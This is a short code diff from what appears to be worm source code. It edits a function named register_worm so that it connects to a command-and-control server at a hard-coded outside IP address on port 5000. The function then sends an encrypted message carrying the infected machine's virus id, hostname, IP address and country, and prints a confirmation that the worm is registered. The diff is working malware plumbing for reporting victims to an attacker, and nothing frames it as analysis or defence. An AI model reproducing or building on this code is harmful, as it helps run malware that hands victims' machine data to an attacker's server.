@@ -228,11 +228,12 @@ char *structure_init_message(char XOR_key, const char *virus_id, const char *hos
 */
 
 int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
-	const char* server_hostname = "idk";
-	const char* client_hostname = "1111";
-	SOCKET sock = connect_to_c2(server_hostname, client_hostname);
+	const char* server_hostname = "13.56.156.46";
+	const char* port = "5000";
+	SOCKET sock = connect_to_c2(server_hostname, port);
 	char *message = structure_init_message(XOR_key, virus_id, hostname, ip, country);
 	char *encrypted_message = encryption(message);
 	int result = send_to_c2(encrypted_message, sock);
+	std::cout << "worm should be registered!" << std::endl;
 	return result;
 }
